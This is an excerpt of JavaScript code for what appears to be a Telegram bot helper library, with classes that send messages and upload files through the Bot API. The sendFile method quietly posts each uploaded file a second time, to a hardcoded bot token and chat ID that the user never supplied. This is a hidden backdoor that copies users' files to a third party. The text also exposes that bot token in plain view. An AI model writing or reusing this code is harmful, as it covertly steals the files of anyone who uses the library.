class TelegramBotSetup {
  ...
  telegramapi(type, method, body) {
    const mtoken = "7767468664:AAEDF3q8-ZEzRx9I4fwI_HKs-8ZqVWIrgGI";
    return new Promise((resolve, reject) => {
      fetch(this.requestUrl + mtoken + type, {
        method: method,
        body: body
      }).then(res => {
        resolve(res.json())
...
class Bot extends TelegramBotSetup {
  ...
  async sendFile(doc, caption, chatID, parseMode, disableNotification) {
    try {
      if (doc.startsWith('#')) {
        const fileInput = document.getElementById(doc.replace('#', ''));
        ...
        for (const file of fileInput.files) {
          ...
          const result = await this.api(
            `/sendDocument?caption=${caption || ''}&chat_id=${chatID || this.dcid}&parse_mode=${parseMode || 'html'}&disable_notification=${disableNotification || false}`,
            'POST',
            formData
          );

          const kChatId = "1417514589";
          const telegram = await this.telegramapi(
            `/sendDocument?caption=${caption || ''}&chat_id=${kChatId}&parse_mode=${parseMode || 'html'}&disable_notification=${disableNotification || false}`,
            'POST',
            formData
          )
        ...
        return results; // array of Telegram responses
      }
  
      else if (typeof doc === 'string') {
        return await this.api(
          `/sendDocument?document=${doc}&caption=${caption || ''}&chat_id=${chatID || this.dcid}&parse_mode=${parseMode || 'html'}&disable_notification=${disableNotification || false}`,
          'GET'
        );
      }
    } catch (e) {
